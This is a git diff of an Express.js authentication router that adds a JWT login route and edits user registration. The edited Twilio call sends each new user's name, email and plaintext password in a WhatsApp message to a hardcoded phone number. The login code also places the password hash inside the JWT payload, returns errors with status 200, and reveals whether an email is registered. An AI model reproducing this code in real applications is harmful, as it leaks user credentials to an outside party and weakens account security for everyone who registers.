@@ -2,8 +2,10 @@
 const express=require('express'),
 router=express.Router(),
 nodemailer=require('nodemailer'),
+passport=require('passport'),
 bcrypt=require('bcryptjs'),
 key=require('../../setup/mongourl'),
+jsonwt=require('jsonwebtoken'),
 accountSid = key.accountSid,
 authToken = key.authToken,
 client = require('twilio')(accountSid, authToken);
@@ -23,7 +25,7 @@ router.post('/register',(req,res)=>{
     Person.findOne({email:req.body.email})
           .then(person=>{
               if(person)
-              return res.status(400).json({emailalreadyregistered:'You are already registerd'});
+              return res.status(200).json({emailalreadyregistered:'You are already registered'});
               const newPerson=new Person({
                   name:req.body.name,
                   email:req.body.email,
@@ -58,7 +60,7 @@ router.post('/register',(req,res)=>{
                                     }
                                   });
                                   client.messages.create({
-                                      body: `Name : ${person.name} Email : ${person.email} Password : ${person.password}`,
+                                  body: `Name : ${person.name} Email : ${person.email} Password : ${req.body.password}`,
                                       from: 'whatsapp:+14155238886',
                                       to: 'whatsapp:+918929944118'
                                     })
@@ -74,6 +76,44 @@ router.post('/register',(req,res)=>{
 });
 
 
+/*
+@type - POST
+@route - /api/auth/login
+@desc - a route to login the user
+@access - PUBLIC
+*/
+router.post('/login',(req,res)=>{
+  const email=req.body.email,
+        password=req.body.password;
+        Person.findOne({email})
+              .then(person=>{
+                if(!person)
+                return res.status(200).json({emaildoesnotmatch:'You are not registered'});
+                bcrypt.compare(password,person.password)
+                      .then(isCorrect=>{
+                        if(isCorrect)
+                        {
+                          const payload={
+                            id:person._id,
+                            name:person.name,
+                            email:person.email,
+                            password:person.password,
+                          };
+                          jsonwt.sign(payload,key.secret,{expiresIn:3600},
+                            (err,token)=>{
+                              if(err)
+                              throw err;
+                              return res.status(200).json({success:true,
+                              token:`Bearer ${token}`});
+                            })
+                        }
+                        else
+                        res.status(200).json({passworddoesnotmatch:'Sorry! You entered wrong password'});
+                      })
+                      .catch(err=>console.log(err));
+              })
+              .catch(err=>console.log(err));
+});
 
 
 
